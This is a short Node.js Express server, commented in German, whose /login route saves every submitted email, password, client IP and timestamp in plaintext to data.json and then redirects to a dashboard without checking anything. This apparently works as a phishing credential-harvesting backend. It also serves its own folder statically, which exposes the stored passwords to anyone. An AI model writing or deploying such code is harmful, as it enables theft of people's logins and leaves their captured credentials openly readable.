const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Middlewares
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // damit index.html & Co ausgeliefert werden

// POST-Login-Route
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const entry = {
    email,
    password,
    ip,
    timestamp: new Date().toISOString()
  };

  // Alte Daten lesen
  let data = [];
  const filePath = path.join(__dirname, 'data.json');
  if (fs.existsSync(filePath)) {
    data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  }

  // Neue hinzufügen und speichern
  data.push(entry);
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

  // Antwort
  res.redirect('/dashboard.html');
});

app.listen(PORT, () => {
  console.log(`Server läuft auf http://localhost:${PORT}`);
});
